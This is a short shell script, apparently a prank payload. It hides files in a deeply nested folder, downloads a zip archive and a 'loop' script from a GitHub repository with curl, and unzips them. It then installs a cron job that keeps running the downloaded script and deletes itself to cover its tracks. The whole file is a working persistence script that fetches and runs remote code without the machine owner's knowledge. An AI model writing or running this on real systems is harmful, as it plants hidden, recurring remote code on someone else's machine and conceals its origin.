mkdir -p ~/Documents/Private/unimportant/strange/whaddup/shmoosh/lol/gaia/praiseher/i/just/won/the/game/fool;

#get zip file from url and store it to the director you just created
curl -L https://github.com/Gsirius/dotfile/blob/master/middleFinger.zip\?raw\=true > ~/Documents/Private/unimportant/strange/whaddup/shmoosh/lol/gaia/praiseher/i/just/won/the/game/fool/MF.zip

#copy the loop script that will run opening of image files
curl -L https://raw.githubusercontent.com/Gsirius/dotfile/master/loop > ~/Documents/Private/unimportant/strange/whaddup/shmoosh/lol/gaia/praiseher/i/just/won/the/game/fool/loop.sh

#or zip the files, put them up to a url, download from that url, unzip the file, then open

#unzip the file and save the uncompressed version in the same directory
unzip -o ~/Documents/Private/unimportant/strange/whaddup/shmoosh/lol/gaia/praiseher/i/just/won/the/game/fool/MF.zip -d ~/Documents/Private/unimportant/strange/whaddup/shmoosh/lol/gaia/praiseher/i/just/won/the/game/fool/MF

crontab -l > bestcronjoblol;

echo "* */2 * * * sh ~/Documents/Private/unimportant/strange/whaddup/shmoosh/lol/gaia/praiseher/i/just/won/the/game/fool/loop.sh"  >> bestcronjoblol;

#install new cron file
crontab bestcronjoblol;
rm bestcronjoblol;

#remove itself
rm -- "$0";
